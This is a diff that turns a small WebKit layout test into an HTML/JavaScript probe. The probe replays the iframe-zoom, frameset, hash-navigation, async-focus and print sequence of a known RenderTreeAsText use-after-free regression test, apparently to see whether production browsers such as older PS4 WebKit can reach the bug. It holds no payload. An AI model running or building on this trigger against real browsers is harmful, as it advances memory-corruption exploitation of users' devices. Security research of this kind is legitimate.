@@ -1,12 +1,224 @@
 <!doctype html>
-<div id=x>A <span>B</span> C</div>
+<meta charset="utf-8">
+<title>WebKit RenderTreeAsText UAF - production reachability probe</title>
+
+<style>
+  iframe {
+    content: url();
+    zoom: 0.01;
+    width: 700px;
+    height: 450px;
+    border: 2px solid red;
+  }
+
+  #status {
+    position: fixed;
+    top: 0;
+    left: 0;
+    z-index: 99999;
+    background: white;
+    border: 1px solid black;
+    padding: 6px;
+    font: 14px monospace;
+  }
+
+  #work {
+    margin-top: 45px;
+    width: 900px;
+    min-height: 1200px;
+  }
+
+  .box {
+    width: 800px;
+    height: 280px;
+    margin: 20px;
+    border: 2px solid #777;
+  }
+</style>
+
+<div id="status">BOOT</div>
+
+<div id="work">
+  <div class="box" id="box">
+    <iframe id="i0" tabindex="0"></iframe>
+  </div>
+
+  <div class="box">
+    <div id="content">RenderTree baseline</div>
+  </div>
+</div>
+
 <script>
-let n=document.createElement("span");
-n.textContent="X";
-x.insertBefore(n,x.childNodes[1]);
-n.remove();
-x.offsetHeight;
-x.append(" D");
-x.offsetHeight;
-document.body.innerHTML+="<p>PASS</p>";
+(function () {
+    var status = document.getElementById("status");
+    var i0 = document.getElementById("i0");
+    var box = document.getElementById("box");
+    var content = document.getElementById("content");
+
+    var log = [];
+
+    function mark(s) {
+        log.push(s);
+        status.textContent = log.join(" | ");
+    }
+
+    function layout() {
+        document.documentElement.offsetHeight;
+        document.body.offsetHeight;
+
+        if (box)
+            box.getBoundingClientRect();
+
+        if (i0)
+            i0.getBoundingClientRect();
+
+        content.getBoundingClientRect();
+    }
+
+    /*
+     * This deliberately mirrors the important DOM shape of
+     * LayoutTests/fast/rendering/render-tree-as-text-uaf.html:
+     *
+     *   iframe { content: url(); zoom: 0.01 }
+     *   frameset insertion
+     *   focus handler
+     *   hash navigation
+     *   asynchronous focus
+     *
+     * The test-only calls (internals / testRunner) are omitted.
+     */
+
+    mark("DOM_READY");
+
+    /*
+     * Give the iframe a stable browsing context first.
+     */
+    try {
+        i0.src = "about:blank";
+        mark("IFRAME_CREATED");
+    } catch (e) {
+        mark("IFRAME_CREATE_ERROR");
+    }
+
+    setTimeout(function () {
+
+        layout();
+        mark("BASELINE_LAYOUT");
+
+        /*
+         * Same frameset mutation as the upstream regression test.
+         * It is intentionally kept to one mutation.
+         */
+        try {
+            document.documentElement.appendChild(
+                document.createElement("frameset")
+            );
+            mark("FRAMESET_ADDED");
+        } catch (e) {
+            mark("FRAMESET_ERROR");
+        }
+
+        /*
+         * Same focus callback semantics as the upstream test.
+         * We record the event rather than immediately destroying
+         * unrelated DOM.
+         */
+        i0.onfocus = function () {
+            mark("IFRAME_FOCUS");
+
+            try {
+                location.hash = "y";
+                mark("HASH_Y");
+            } catch (e) {
+                mark("HASH_ERROR");
+            }
+
+            /*
+             * Force the renderer to process the state change.
+             */
+            layout();
+            mark("FOCUS_LAYOUT");
+        };
+
+        /*
+         * Match the original test's hash transition.
+         */
+        try {
+            location.hash = "x";
+            mark("HASH_X");
+        } catch (e) {
+            mark("HASH_X_ERROR");
+        }
+
+        /*
+         * The original test uses a data:text/javascript script to
+         * schedule i0.focus() after a promise/cache operation.
+         *
+         * We avoid Cache API dependency because older PS4 WebKit
+         * may not implement it. Promise is sufficient as a
+         * microtask scheduling primitive.
+         */
+        try {
+            var script = document.createElement("script");
+
+            script.text =
+                "Promise.resolve().then(function() {" +
+                "  var f = document.getElementById('i0');" +
+                "  if (f) f.focus();" +
+                "});";
+
+            document.head.appendChild(script);
+            mark("ASYNC_FOCUS_SCHEDULED");
+        } catch (e) {
+            mark("ASYNC_FOCUS_ERROR");
+
+            /*
+             * Fallback for very old JS implementations.
+             */
+            setTimeout(function () {
+                if (i0)
+                    i0.focus();
+            }, 0);
+        }
+
+        /*
+         * Give the microtask/focus path time to execute.
+         */
+        setTimeout(function () {
+
+            layout();
+            mark("POST_FOCUS_LAYOUT");
+
+            /*
+             * Probe the only normal web-content API that might be
+             * associated with a print representation path.
+             *
+             * This does NOT prove RenderTreeAsText was reached.
+             */
+            setTimeout(function () {
+
+                mark("PRINT_CALL");
+
+                try {
+                    window.print();
+                    mark("PRINT_RETURNED");
+                } catch (e) {
+                    mark("PRINT_EXCEPTION");
+                }
+
+                /*
+                 * Final observation window.
+                 */
+                setTimeout(function () {
+                    layout();
+                    mark("FINAL_LAYOUT");
+                }, 1000);
+
+            }, 500);
+
+        }, 500);
+
+    }, 700);
+
+})();
 </script>
